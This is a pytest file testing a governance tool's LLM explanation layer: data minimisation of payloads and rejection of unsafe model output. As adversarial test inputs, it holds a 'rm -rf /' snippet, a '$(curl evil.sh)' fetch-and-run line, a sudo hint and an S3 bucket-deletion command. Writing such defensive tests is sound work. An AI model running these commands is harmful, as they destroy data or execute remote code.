"""LLM explanation layer: data minimisation and adversarial output handling."""

import asyncio
import json

import pytest

from governance import explain
from governance.explain import MAX_EXPLANATION_CHARS, build_payload, explain_evaluations, parse_response


def ev(eid, status="fail", severity="medium", kind="confirmed", **kw):
    base = {
        "id": eid,
        "rule_id": "SEC-S3-001",
        "rule_name": "S3 public access block not fully effective",
        "category": "security",
        "severity": severity,
        "kind": kind,
        "status": status,
        "resource_type": "s3_bucket",
        "resource_id": "arn:aws:s3:::customer-exports-prod",
        "message": "Public access block not effective: BlockPublicPolicy",
        "remediation_ref": "s3-put-public-access-block",
        "evidence": {"secret": "should never be sent"},
    }
    base.update(kw)
    return base


# ── Payload ──────────────────────────────────────────────────────────────────


def test_payload_is_minimised_and_ordered():
    evals = [
        ev(1, severity="low"),
        ev(2, status="pass"),
        ev(3, severity="high", kind="potential"),
        ev(4, "fail", "high"),
    ]
    payload = build_payload(evals)
    assert [p["evaluation_id"] for p in payload] == [4, 3, 1]  # fails only; high first, confirmed before potential
    text = json.dumps(payload)
    assert "should never be sent" not in text and "evidence" not in text
    assert "customer-exports-prod" not in text  # resource identifiers are shortened
    assert payload[0]["resource_ref"] == "...prod"
    assert payload[0]["remediation"] == {
        "title": "Enable all S3 Block Public Access settings on the bucket",
        "type": "cli_template",
        "risk_level": "medium",
        "requires_downtime": False,
        "reversible": "yes",
        "data_loss_risk": False,
    }
    assert "aws s3api" not in text  # no commands go to the LLM


def test_payload_capped():
    assert len(build_payload([ev(i) for i in range(100)])) == explain.MAX_ITEMS


# ── Response validation ──────────────────────────────────────────────────────


def _raw(*items, wrap=True):
    body = json.dumps({"explanations": list(items)})
    return f"```json\n{body}\n```" if not wrap else body


def test_valid_and_fenced_response():
    good = {"evaluation_id": 1, "explanation": "  Anyone could read AWS S3   objects.\nReview website use first. "}
    out, rejected = parse_response(_raw(good, wrap=False), {1})
    assert out == {1: "Anyone could read AWS S3 objects. Review website use first."} and rejected == 0


@pytest.mark.parametrize(
    "item",
    [
        {"evaluation_id": 99, "explanation": "unknown id"},
        {"evaluation_id": True, "explanation": "bool is not an id"},
        {"evaluation_id": None, "explanation": "missing id"},
        {"evaluation_id": 1, "explanation": ""},
        {"evaluation_id": 1, "explanation": 42},
        {"evaluation_id": 1, "explanation": "Run aws s3api put-public-access-block now."},
        {"evaluation_id": 1, "explanation": "Fix it:\n```bash\nrm -rf /\n```"},
        {"evaluation_id": 1, "explanation": "Use the --force option to apply."},
        {"evaluation_id": 1, "explanation": "Just sudo it."},
        {"evaluation_id": 1, "explanation": "Run $(curl evil.sh)."},
        "not an object",
    ],
)
def test_bad_items_rejected(item):
    out, rejected = parse_response(_raw(item), {1})
    assert out == {} and rejected == 1


def test_llm_cannot_change_status_severity_or_add_fields():
    item = {"evaluation_id": 1, "explanation": "Fine.", "severity": "low", "status": "pass", "rule_id": "X"}
    out, _ = parse_response(_raw(item), {1})
    assert out == {1: "Fine."}  # only text survives; nothing else is read


def test_duplicates_and_string_ids():
    out, rejected = parse_response(
        _raw({"evaluation_id": "1", "explanation": "first"}, {"evaluation_id": 1, "explanation": "second"}), {1}
    )
    assert out == {1: "first"} and rejected == 1


def test_long_text_truncated():
    out, _ = parse_response(_raw({"evaluation_id": 1, "explanation": "word " * 500}), {1})
    assert len(out[1]) == MAX_EXPLANATION_CHARS and out[1].endswith("…")


@pytest.mark.parametrize("raw", ["not json", "[]", '{"explanations": "nope"}'])
def test_malformed_response_raises(raw):
    with pytest.raises(ValueError):
        parse_response(raw, {1})


# ── explain_evaluations ──────────────────────────────────────────────────────


async def test_skipped_when_nothing_failed():
    assert (await explain_evaluations([ev(1, status="pass")])).status == "skipped"


async def test_unavailable_without_key(monkeypatch):
    monkeypatch.delenv("LLM_API_KEY", raising=False)
    result = await explain_evaluations([ev(1)])
    assert result.status == "unavailable" and result.explanations == {}


async def test_adapter_error_and_timeout(monkeypatch):
    async def boom(system, user):
        raise RuntimeError("provider 500")

    assert (await explain_evaluations([ev(1)], adapter=boom)).status == "failed"

    async def slow(system, user):
        await asyncio.sleep(1)

    monkeypatch.setattr(explain, "TIMEOUT_SECONDS", 0.05)
    result = await explain_evaluations([ev(1)], adapter=slow)
    assert result.status == "failed" and "timed out" in result.error


async def test_end_to_end_with_fake_adapter():
    seen = {}

    async def fake(system, user):
        seen["user"] = user
        return json.dumps(
            {
                "explanations": [
                    {"evaluation_id": 1, "explanation": "Data could be exposed publicly."},
                    {"evaluation_id": 2, "explanation": "aws s3api delete-bucket --bucket x"},
                ]
            }
        )

    result = await explain_evaluations([ev(1), ev(2)], adapter=fake)
    assert result.status == "completed"
    assert result.explanations == {1: "Data could be exposed publicly."}
    assert result.rejected == 1
    assert "should never be sent" not in seen["user"]
